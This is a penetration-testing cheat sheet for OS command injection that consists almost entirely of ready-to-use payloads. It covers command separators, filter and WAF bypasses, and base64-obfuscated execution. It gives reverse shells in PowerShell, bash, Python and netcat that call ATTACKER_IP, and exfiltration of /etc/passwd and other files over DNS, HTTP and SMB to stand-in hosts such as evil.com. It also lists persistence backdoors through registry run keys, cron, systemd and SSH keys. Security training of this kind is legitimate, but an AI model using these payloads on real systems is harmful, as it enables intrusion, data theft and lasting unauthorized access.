# OS Command Injection

OS Command Injection vulnerabilities allow attackers to execute arbitrary system commands on web servers, leading to complete system compromise, data exfiltration, and persistent backdoor access.

---

## Common Injection Points

```
# URL parameters
?file=document.pdf
?path=/var/www/html
?cmd=ping
?ip=192.168.1.1
?host=example.com

# POST parameters
filename=report.txt
directory=/uploads
command=backup
target=server01
```

### Target Functionalities

- File operations (upload, download, delete)
- Network utilities (ping, traceroute, nslookup)
- System administration (backup, logs, monitoring)
- Git operations (clone, pull, push)
- Image processing (resize, convert, compress)

---

## Command Separators & Operators

### Universal Separators

```bash
; whoami          # Semicolon
| whoami          # Pipe
&& whoami         # AND operator
|| whoami         # OR operator
& whoami          # Background execution
```

### Windows-Specific

```cmd
& whoami          # Single ampersand (CMD)
| whoami          # Pipe
`whoami`          # Command substitution
```

### Linux-Specific

```bash
$(whoami)         # Command substitution
`whoami`          # Backticks
%0A whoami        # Newline injection
%0D%0A whoami     # CRLF injection
```

---

## Basic Detection Commands

### Windows

```cmd
; whoami
; hostname
; systeminfo
; ipconfig
; ipconfig /all
; netstat -an
; dir C:\
; type C:\Windows\System32\drivers\etc\hosts
```

### Linux

```bash
; whoami
; id
; uname -a
; cat /etc/passwd
; ifconfig
; ip addr
; netstat -tulpn
; ls -la
; pwd
```

### URL Encoding Reference

```
%3B = ;
%26 = &
%7C = |
%20 = space
%0A = newline
%0D = carriage return
%253B = %3B (double encoded semicolon)
%2526 = %26 (double encoded ampersand)
```

---

## Filter Bypass Techniques

### Keyword Filtering Bypasses

```bash
# Case manipulation
WHOAMI, WhOaMi, wHoAmI

# Character insertion
who'ami, who"ami, who\ami

# Variable expansion (Linux)
$USER, ${USER}, $HOME

# Environment variables (Windows)
%USERNAME%, %COMPUTERNAME%

# Command alternatives
# Instead of 'cat': less, more, head, tail, nl, od
# Instead of 'ls': dir, find, locate, echo *
# Instead of 'whoami': id, $USER, %USERNAME%
```

### Space Filtering Bypasses

```bash
# Tab character
%09whoami

# Internal Field Separator (Linux)
${IFS}whoami
cat${IFS}/etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Redirection
<whoami
cat</etc/passwd

# Variable assignment
X=$'cat\x20/etc/passwd';$X
```

### Command Obfuscation

```bash
# Base64 encoding (Linux)
echo "d2hvYW1p" | base64 -d | bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh

# Hex encoding
echo -e "\x77\x68\x6f\x61\x6d\x69"

# Octal encoding
$(printf "\167\150\157\141\155\151")

# PowerShell encoding (Windows)
powershell -enc dwBoAG8AYQBtAGkA
```

---

## Blind Command Injection

### Time-Based Detection

```bash
; sleep 10
; ping -c 10 127.0.0.1
; timeout 10
```

### DNS Exfiltration

```bash
; nslookup $(whoami).attacker.com
; dig $(id).evil.com
```

### HTTP Exfiltration

```bash
; curl http://ATTACKER_IP/$(whoami)
; wget http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)
```

### Out-of-Band Detection

```bash
# HTTP callbacks
; curl http://COLLABORATOR/$(whoami)

# DNS callbacks
; nslookup test.COLLABORATOR
; host $(whoami).evil.com

# ICMP callbacks
; ping -c 1 ATTACKER_IP
```

---

## Reverse Shell Payloads

### Windows - PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Windows - Powercat

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://ATTACKER_IP/powercat.ps1");powercat -c ATTACKER_IP -p 4444 -e powershell
```

### Linux - Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

### Linux - Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Linux - Netcat

```bash
# With -e flag
nc -e /bin/sh ATTACKER_IP 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## Data Exfiltration

### Windows

```cmd
# PowerShell web upload
powershell "(New-Object System.Net.WebClient).UploadFile('http://ATTACKER_IP:8000/upload', 'C:\sensitive.txt')"

# Base64 exfiltration
powershell "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\sensitive.txt'))"

# SMB exfiltration
copy C:\sensitive.txt \\ATTACKER_IP\share\
```

### Linux

```bash
# HTTP POST exfiltration
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP:8000/upload

# Base64 HTTP exfiltration
curl -d "data=$(cat /etc/passwd | base64)" http://ATTACKER_IP:8000/

# DNS exfiltration
for line in $(cat /etc/passwd | base64 | tr -d '\n' | fold -w 32); do nslookup $line.evil.com; done

# Netcat file transfer
cat /etc/passwd | nc ATTACKER_IP 4444
```

### Database Exfiltration

```bash
mysqldump -u root -p database_name > /tmp/dump.sql
pg_dump -U postgres database_name > /tmp/dump.sql
sqlite3 database.db .dump > /tmp/dump.sql
```

---

## Advanced WAF/Filter Evasion

```bash
# Unicode encoding
%u0077%u0068%u006f%u0061%u006d%u0069

# Hex encoding
\x77\x68\x6f\x61\x6d\x69

# Concatenation
who'a'mi
who"a"mi
who\ami

# Variable substitution (Linux)
w$@ho$@ami
who$()ami
```

---

## Persistence Mechanisms

### Windows

```cmd
# Registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "powershell -WindowStyle Hidden -File C:\Windows\Temp\backdoor.ps1"

# Scheduled task
schtasks /create /tn "Update" /tr "powershell -WindowStyle Hidden -File C:\Windows\Temp\backdoor.ps1" /sc onlogon

# Service creation
sc create "Service" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
```

### Linux

```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -

# SSH authorized keys
mkdir -p ~/.ssh; echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
```

---

## Privilege Escalation After Injection

### Windows

```cmd
systeminfo
whoami /priv
whoami /groups
net user
net localgroup administrators
sc query
schtasks /query /fo LIST /v
```

### Linux

```bash
id
sudo -l
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | grep -v proc
uname -a
cat /etc/crontab
ls -la /etc/cron*
```

---

## Real-World Injection Examples

### Ping Command

```bash
# Vulnerable code: system("ping -c 4 " + userInput)
127.0.0.1; cat /etc/passwd
127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
```

### Git Clone

```bash
# Vulnerable code: system("git clone " + userInput)
https://github.com/test/repo.git; whoami
```

### File Processing

```bash
# Vulnerable code: system("convert " + filename + " output.jpg")
input.jpg; wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

### Backup Script (tar wildcard injection)

```bash
# Vulnerable code: system("tar -czf backup.tar.gz " + directory)
/var/www/html --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite | Intercept and modify requests |
| curl | Manual command injection testing |
| Netcat | Reverse shell listeners |
| PowerShell | Windows command execution and payloads |
| Powercat | PowerShell reverse shell utility |
